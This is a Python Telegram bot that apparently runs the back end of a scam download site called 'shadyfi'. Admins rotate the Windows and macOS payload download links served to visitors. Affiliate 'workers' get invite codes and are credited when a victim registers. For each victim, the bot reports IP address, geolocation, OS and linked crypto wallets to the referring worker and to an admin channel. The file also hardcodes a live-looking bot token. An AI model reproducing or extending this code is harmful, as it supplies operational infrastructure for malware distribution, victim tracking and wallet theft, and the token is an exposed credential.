import json
import os
import random
import string
from telegram.ext import Application, CommandHandler
from telegram.ext import Application, CommandHandler
import geoip2.database
import logging
import aiohttp
from bs4 import BeautifulSoup
import subprocess
from datetime import datetime
import asyncio
from telegram import User as TgUser

# Bot configuration
BOT_TOKEN = "7936376103:AAHznIsNYno8xkLmxEyUdpTkBvW3A3B-hiI" # Your bot token here
BOT_ADMINS = [8130552297, 7021328479]  # List of admin user IDs
HTML_FILE_PATH = '/var/www/shadyfi/download.html'
DB_JSON_PATH = '/var/www/shadyfi/TGbot/db.json'
USERS_JSON_PATH = '/var/www/shadyfi/DB/Users.json'
LINKS_JSON_PATH = '/var/www/shadyfi/DB/Links.json'
ADMIN_CHANNEL_ID = "-1002427910753"

# Initialize GeoIP database
try:
    GEOIP_READER = geoip2.database.Reader('GeoLite2-City.mmdb')
except Exception as e:
    print(f"GeoIP database error: {e}")
    GEOIP_READER = None

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def generate_unique_code() -> str:
    """Generate a unique 6-character invite code."""
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choice(chars) for _ in range(6))

def get_flag_emoji(country_code: str) -> str:
    """Generate flag emoji from country code."""
    try:
        return ''.join(chr(127397 + ord(char)) for char in country_code.upper())
    except:
        return ""

def load_db():
    """Load TGbot/db.json or initialize if it doesn't exist or is invalid."""
    try:
        if not os.path.exists(DB_JSON_PATH):
            os.makedirs(os.path.dirname(DB_JSON_PATH), exist_ok=True)
            with open(DB_JSON_PATH, 'w') as f:
                json.dump({'users': []}, f)
                logger.info(f"Created new db.json at {DB_JSON_PATH}")
        with open(DB_JSON_PATH, 'r') as f:
            data = json.load(f)
            if 'users' not in data:
                logger.warning("db.json missing 'users' key, initializing with empty list")
                data = {'users': []}
                save_db(data)
            return data
    except json.JSONDecodeError:
        logger.error("db.json is corrupted or invalid, reinitializing")
        data = {'users': []}
        save_db(data)
        return data
    except Exception as e:
        logger.error(f"Error loading db.json: {e}")
        data = {'users': []}
        save_db(data)
        return data

def save_db(data):
    """Save data to TGbot/db.json."""
    try:
        with open(DB_JSON_PATH, 'w') as f:
            json.dump(data, f, indent=2)
        logger.info(f"Saved data to db.json")
    except Exception as e:
        logger.error(f"Error saving db.json: {e}")

def load_users_json():
    """Load DB/Users.json or initialize if it doesn't exist or is invalid."""
    try:
        if not os.path.exists(USERS_JSON_PATH):
            os.makedirs(os.path.dirname(USERS_JSON_PATH), exist_ok=True)
            with open(USERS_JSON_PATH, 'w') as f:
                json.dump({'users': []}, f)
                logger.info(f"Created new Users.json at {USERS_JSON_PATH}")
        with open(USERS_JSON_PATH, 'r') as f:
            data = json.load(f)
            if 'users' not in data:
                logger.warning("Users.json missing 'users' key, initializing with empty list")
                data = {'users': []}
                save_users_json(data)
            return data
    except json.JSONDecodeError:
        logger.error("Users.json is corrupted or invalid, reinitializing")
        data = {'users': []}
        save_users_json(data)
        return data
    except Exception as e:
        logger.error(f"Error loading Users.json: {e}")
        data = {'users': []}
        save_users_json(data)
        return data

def save_users_json(data):
    """Save data to DB/Users.json."""
    try:
        with open(USERS_JSON_PATH, 'w') as f:
            json.dump(data, f, indent=2)
        logger.info(f"Saved data to Users.json")
    except Exception as e:
        logger.error(f"Error saving Users.json: {e}")

async def start_command(update, context):
    """Handle /start command."""
    user_id = update.effective_user.id
    db_data = load_db()
    user = next((u for u in db_data['users'] if u['id'] == user_id), None)
    if user:
        await update.message.reply_text('You are already registered')
        await update.message.reply_text(f'Your code is: `{user["code"]}`', parse_mode='Markdown')
    else:
        code = generate_unique_code()
        while any(u['code'] == code for u in db_data['users']):
            code = generate_unique_code()
        db_data['users'].append({'id': user_id, 'code': code})
        save_db(db_data)
        await update.message.reply_text(f'Your invite code: `{code}`', parse_mode='Markdown')
        logger.info(f"New user registered with ID {user_id} and code {code}")

async def update_download_link(platform, new_link):
    """Update the download link in DB/Links.json for the specified platform."""
    try:
        # Load or create structure
        if os.path.exists(LINKS_JSON_PATH):
            with open(LINKS_JSON_PATH, 'r') as f:
                links = json.load(f)
        else:
            links = {}
        # Update link
        key = 'windows' if platform.lower() == 'windows' else 'mac'
        links[key] = new_link
        # Save back
        with open(LINKS_JSON_PATH, 'w') as f:
            json.dump(links, f, indent=2, ensure_ascii=False)
        logger.info(f"Updated {platform} download link to {new_link} in Links.json")
        return True
    except Exception as e:
        logger.error(f"Failed to update {platform} link in Links.json: {e}")
        return False

async def win_command(update, context):
    """Handle /win command for admins to update Windows download link."""
    if update.effective_user.id not in BOT_ADMINS:
        await update.message.reply_text('? Unauthorized')
        return

    new_link = context.args[0] if context.args else ''
    if not new_link.startswith('http'):
        await update.message.reply_text('? Invalid link format')
        return

    try:
        success = await update_download_link('Windows', new_link)
        if success:
            await update.message.reply_text(f'? Windows link updated!\n{new_link}')
        else:
            raise Exception('Failed to update Windows link')
    except Exception as e:
        await update.message.reply_text(f'? Error: {str(e)}')

async def mac_command(update, context):
    """Handle /mac command for admins to update MacOS download link."""
    if update.effective_user.id not in BOT_ADMINS:
        await update.message.reply_text('? Unauthorized')
        return

    new_link = context.args[0] if context.args else ''
    if not new_link.startswith('http'):
        await update.message.reply_text('? Invalid link format')
        return

    try:
        success = await update_download_link('MacOS', new_link)
        if success:
            await update.message.reply_text(f'? MacOS link updated!\n{new_link}')
        else:
            raise Exception('Failed to update Mac link')
    except Exception as e:
        await update.message.reply_text(f'? Error: {str(e)}')

async def code_command(update, context):
    """Handle /code command."""
    user_id = update.effective_user.id
    db_data = load_db()
    user = next((u for u in db_data['users'] if u['id'] == user_id), None)
    if user:
        await update.message.reply_text(f'Your code is: {user["code"]}')
    else:
        await update.message.reply_text('You are not registered, please use /start')

async def track_activity(update, context):
    """Handle activity tracking via bot command."""
    args = context.args
    if len(args) < 4:
        await update.message.reply_text('Invalid tracking data')
        return

    ip = args[0]
    activity_type = args[1]
    device = args[2]
    agent = args[3]
    code = args[4] if len(args) > 4 else ''

    try:
        geo = GEOIP_READER.city(ip) if GEOIP_READER else None
        flag = get_flag_emoji(geo.country.iso_code if geo else 'US')
        city = geo.city.name if geo else 'unknown'
    except:
        flag = get_flag_emoji('US')
        city = 'unknown'

    message = f"{activity_type}\n" \
              f"{flag} {ip}\n" \
              f"Device: {device}\n" \
              f"User agent: {agent}\n" \
              f"City: {city}"

    db_data = load_db()
    user = next((u for u in db_data['users'] if u['code'] == code), None)
    if not user:
        logger.error(f"User with code {code} not found for tracking")
        await update.message.reply_text('User not found')
        return

    user_id = user['id']
    async def send_messages():
        async with aiohttp.ClientSession() as session:
            # Send to user
            await send_telegram_message(session, user_id, message)
            # Send to admins
            for admin in BOT_ADMINS:
                await send_telegram_message(session, admin, f"{message}\n{user_id}")

    await send_messages()
    await update.message.reply_text('Activity tracked')

async def send_telegram_message(session, chat_id, text, parse_mode=None):
    """Helper to send Telegram message."""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {'chat_id': chat_id, 'text': text}
        if parse_mode:
            payload['parse_mode'] = parse_mode
        async with session.post(url, json=payload) as resp:
            if resp.status != 200:
                logger.error(f"Failed to send message to {chat_id}: {await resp.text()}")
    except Exception as e:
        logger.error(f"Error sending message to {chat_id}: {e}")

async def get_location_by_ip(ip):
    """Get country and city by IP using ip-api.com"""
    url = f"http://ip-api.com/json/{ip}?fields=status,country,city,countryCode,message"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=5) as resp:
                data = await resp.json()
                if data.get('status') == 'success':
                    return data.get('country', 'unknown'), data.get('city', 'unknown'), data.get('countryCode', None)
                else:
                    return 'unknown', 'unknown', None
    except Exception as e:
        logger.error(f"GeoIP API error for IP {ip}: {e}")
        return 'unknown', 'unknown', None

async def notify_new_users_task(application):
    """Task to notify about new users."""
    known_emails = set()
    users_data = load_users_json()
    for user in users_data['users']:
        if 'email' in user:
            known_emails.add(user['email'])
    while True:
        await asyncio.sleep(10)
        users_data = load_users_json()
        db_data = load_db()
        for user in users_data['users']:
            email = user.get('email')
            code = user.get('inviteCode')
            if email and email not in known_emails:
                known_emails.add(email)
                db_user = next((u for u in db_data['users'] if u['code'] == code), None)
                if db_user:
                    user_id = db_user['id']
                    try:
                        tg_user: TgUser = await application.bot.get_chat(user_id)
                        nickname = tg_user.username or tg_user.first_name or str(user_id)
                    except Exception as e:
                        nickname = str(user_id)
                    ip = user.get('ip', 'unknown')
                    os = user.get('os', 'unknown')
                    # Определяем страну и город через API
                    country, city, country_code = await get_location_by_ip(ip)
                    flag = get_flag_emoji(country_code) if country_code else '❌'
                    ip_mark = ""
                    if country == 'unknown' and city == 'unknown':
                        ip_mark = " (Location hidden)"

                    wallets = user.get('wallets')
                    if wallets and isinstance(wallets, list) and wallets:
                        wallets_str = ', '.join(wallets)
                    else:
                        wallets_str = 'Unlinked'
                    msg = (
                        "💚 **New registration notice!**\n"
                        f"🆔 **ID:** `{user_id}`\n"
                        f"📡 **IP address:** `{ip}`{ip_mark}\n"
                        f"{flag} **Country:** `{country}`\n"
                        f"🌆 **City:** `{city}`\n"
                        f"👛 **Wallets:** {wallets_str}\n"
                        f"💻 **OS:** `{os}`\n"
                        f"👤 **Worker:** @{nickname}"
                    )

                    msg_user = (
                        "✉️ New registration!\n"
                        f"📡 IP address: {ip}{ip_mark}\n"
                        f"{flag} Country: {country}\n"
                        f"🌆 City: {city}\n"
                        f"👛 Wallets: {wallets_str}\n"
                        f"💻 OS: {os}"
                    )
                    # Send message to User (for testing)
                    # async with aiohttp.ClientSession() as session:
                    #    await send_telegram_message(session, user_id, msg, parse_mode="Markdown")
                    # Send message to admins in channel
                    async with aiohttp.ClientSession() as session:
                        await send_telegram_message(session, user_id, msg_user, parse_mode="Markdown") # Если нужно отправить юзеру
                        await send_telegram_message(session, ADMIN_CHANNEL_ID, f"{msg}", parse_mode="Markdown")


def main():
    """Main function to start bot."""
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler('start', start_command))
    application.add_handler(CommandHandler('win', win_command))
    application.add_handler(CommandHandler('mac', mac_command))
    application.add_handler(CommandHandler('code', code_command))
    application.add_handler(CommandHandler('track', track_activity))

    loop = asyncio.get_event_loop()
    loop.create_task(notify_new_users_task(application))
    application.run_polling()

if __name__ == '__main__':
    main()